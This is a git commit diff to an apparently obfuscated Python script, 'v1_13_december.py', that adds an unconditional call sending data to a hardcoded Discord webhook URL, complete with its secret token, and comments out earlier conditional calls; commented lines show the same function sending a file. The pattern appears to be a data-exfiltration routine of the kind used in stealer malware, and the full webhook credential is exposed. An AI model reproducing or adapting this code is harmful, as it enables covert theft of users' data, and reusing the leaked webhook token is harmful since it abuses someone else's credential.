8a53e68db8c65e6226b0a92fbaf199a12cb39775
xlxkckxlz123kxzcx <hjorrdns@gmail.com>
2024-12-14 00:02:27 +0800

    Update v1_13_december.py

--- v1_13_december.py
+++ v1_13_december.py
@@ -203,13 +203,13 @@ def lsxlsx(webhook_url, file_to_send=None):
     else:
         print(f"")
 
-
+lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
 if file_contentsx1=="dflCLzWZeuN9D":
-    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
     #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
 
 if file_contentsx1=="uSDKdEt8VddC8":
-    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
     #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
 def add_path_and_install_libraries():
     try:
